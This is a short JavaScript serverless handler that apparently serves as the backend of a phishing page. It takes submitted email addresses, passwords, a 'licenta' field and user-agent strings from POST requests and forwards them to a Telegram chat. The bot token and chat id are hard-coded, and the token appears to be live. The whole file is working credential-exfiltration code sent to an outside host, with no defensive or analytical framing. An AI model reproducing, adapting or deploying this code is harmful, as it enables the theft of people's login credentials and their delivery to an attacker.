module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  console.log('bammmmmmmmm')
  const token = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
  const chatId = '-5050388811';

  try {
    const { email, pass, licenta, agent } = req.body;

    const message = `
📩  habitat

📧 Email: ${email}
🔑 Pass: ${pass}
licenta: ${licenta}
🖥️ Agent: ${agent}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    const data = await tgRes.json();

    return res.status(200).json({
      ok: true,
      telegram: data
    });

  } catch (err) {
    return res.status(500).json({
      error: 'Server error',
      details: err.message
    });
  }
};
